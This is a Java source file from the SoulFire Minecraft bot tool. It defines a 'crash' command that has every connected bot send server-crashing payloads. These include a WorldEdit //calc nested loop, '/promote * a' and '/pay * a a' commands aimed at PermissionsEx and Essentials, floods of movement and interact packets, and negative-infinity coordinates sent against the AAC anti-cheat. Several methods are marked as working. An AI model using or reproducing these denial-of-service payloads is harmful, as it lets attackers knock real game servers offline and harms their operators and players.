/*
 * SoulFire
 * Copyright (C) 2024  AlexProgrammerDE
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */
package net.pistonmaster.soulfire.server.command.commands.misc;

import com.github.steveice10.mc.protocol.data.game.entity.player.Hand;
import com.github.steveice10.mc.protocol.data.game.entity.player.InteractAction;
import com.github.steveice10.mc.protocol.packet.ingame.serverbound.player.ServerboundInteractPacket;
import com.github.steveice10.mc.protocol.packet.ingame.serverbound.player.ServerboundMovePlayerPosPacket;
import com.mojang.brigadier.Command;
import lombok.extern.slf4j.Slf4j;
import net.pistonmaster.soulfire.server.command.ICommand;
import net.pistonmaster.soulfire.server.command.ServerCommandManager;
import net.pistonmaster.soulfire.server.command.SoulfireCommandSyntaxException;

import java.util.List;

@Slf4j
public class CrashCommand implements ICommand {
    private static final List<String> METHODS = List.of("book", "calc", "fly", "sleep", "permissionsex", "aac", "essentials", "anvil", "chest");

    @Override
    public List<String> getAliases() {
        return List.of("crash");
    }

    @Override
    public String getDescription() {
        return "Attempts to crash the server.";
    }

    @Override
    public String getSyntax() {
        StringBuilder builder = new StringBuilder("<");
        METHODS.forEach(m -> builder.append(m).append("|"));
        builder.deleteCharAt(builder.length() - 1);
        builder.append(">");
        return builder.toString();
    }

    @Override
    public int onCommand(String cmd, String[] args, ServerCommandManager manager) {
        if (args.length != 1) {
            throw new SoulfireCommandSyntaxException("You need to specify a method to crash");
        }

        String method = args[0].toLowerCase();

        if (!METHODS.contains(method)) {
            throw new SoulfireCommandSyntaxException("Invalid method! Valid methods are: " + String.join(", ", METHODS));
        }

        log.info("Crashing server with method: " + method);

        return switch (method) {
            case "book" -> crashBook(manager);
            case "calc" -> crashCalc(manager);
            case "fly" -> crashFly(manager);
            case "sleep" -> crashSleep(manager);
            case "permissionsex" -> crashPex(manager);
            case "aac" -> crashAAC(manager);
            case "essentials" -> crashEssentials(manager);
            case "anvil" -> crashAnvil(manager);
            case "chest" -> crashChest(manager);
            default -> Command.SINGLE_SUCCESS;
        };

    }

    private int crashBook(ServerCommandManager manager) {
        log.error("Book crash not implemented yet!");
        return Command.SINGLE_SUCCESS;
    }

    private int crashCalc(ServerCommandManager manager) { // Work
        manager.forEveryBot((bot) -> {
            bot.botControl().sendMessage("//calc for(i=0;i<256;i++){for(a=0;a<256;a++){for(b=0;b<256;b++){for(c=0;c<256;c++){}}}}");
            return Command.SINGLE_SUCCESS;
        });
        return Command.SINGLE_SUCCESS;
    }

    private int crashFly(ServerCommandManager manager) {
        // TODO: 17/02/2024 seems broken, check in older versions or if there is a problem related to the packets buffer
        manager.forEveryBot((bot) -> {
            double botX = bot.sessionDataManager().clientEntity().x();
            double botY = bot.sessionDataManager().clientEntity().y();
            double botZ = bot.sessionDataManager().clientEntity().z();

            for (int i = 0; i < 36; i++) {
                botY += 9;
                ServerboundMovePlayerPosPacket packet = new ServerboundMovePlayerPosPacket(
                        true,
                        botX,
                        botY,
                        botZ
                );
                bot.sessionDataManager().sendPacket(packet);
            }

            for (int i = 0; i < 10000; i++) {
                botX += 9;
                ServerboundMovePlayerPosPacket packet = new ServerboundMovePlayerPosPacket(
                        true,
                        botX,
                        botY,
                        botZ
                );
                bot.sessionDataManager().sendPacket(packet);
            }

            return Command.SINGLE_SUCCESS;
        });
        return Command.SINGLE_SUCCESS;
    }

    private int crashSleep(ServerCommandManager manager) {
        manager.forEveryBot((bot) -> {
            // TODO: 17/02/2024 check if there is a specific packet for leaving bed
            ServerboundInteractPacket packet = new ServerboundInteractPacket(
                    bot.sessionDataManager().clientEntity().entityId(),
                    InteractAction.INTERACT,
                    Hand.MAIN_HAND,
                    false
            );

            for (int i = 0; i < 2000; i++) {
                bot.sessionDataManager().sendPacket(packet);
            }

            return Command.SINGLE_SUCCESS;
        });
        return Command.SINGLE_SUCCESS;
    }

    private int crashPex(ServerCommandManager manager) { // Work
        manager.forEveryBot((bot) -> {
            bot.botControl().sendMessage("/promote * a");
            return Command.SINGLE_SUCCESS;
        });
        return Command.SINGLE_SUCCESS;
    }

    private int crashAAC(ServerCommandManager manager) {
        // TODO: 17/02/2024 find old version of AAC crack to test
        ServerboundMovePlayerPosPacket packet = new ServerboundMovePlayerPosPacket(
                true,
                Double.NEGATIVE_INFINITY,
                Double.NEGATIVE_INFINITY,
                Double.NEGATIVE_INFINITY
        );
        manager.forEveryBot((bot) -> {
            bot.sessionDataManager().sendPacket(packet);
            return Command.SINGLE_SUCCESS;
        });
        return Command.SINGLE_SUCCESS;
    }

    private int crashEssentials(ServerCommandManager manager) { // work
        manager.forEveryBot((bot) -> {
            bot.botControl().sendMessage("/pay * a a");
            return Command.SINGLE_SUCCESS;
        });
        return Command.SINGLE_SUCCESS;
    }

    private int crashAnvil(ServerCommandManager manager) {
        // try damage 3 and 16384
        log.error("Anvil crash not implemented yet!");
        return Command.SINGLE_SUCCESS;
    }

    private int crashChest(ServerCommandManager manager) {
        // create huge NBT data on chest and place the most possible chest to "crash" the area
        log.error("Chest crash not implemented yet!");
        return Command.SINGLE_SUCCESS;
    }
}
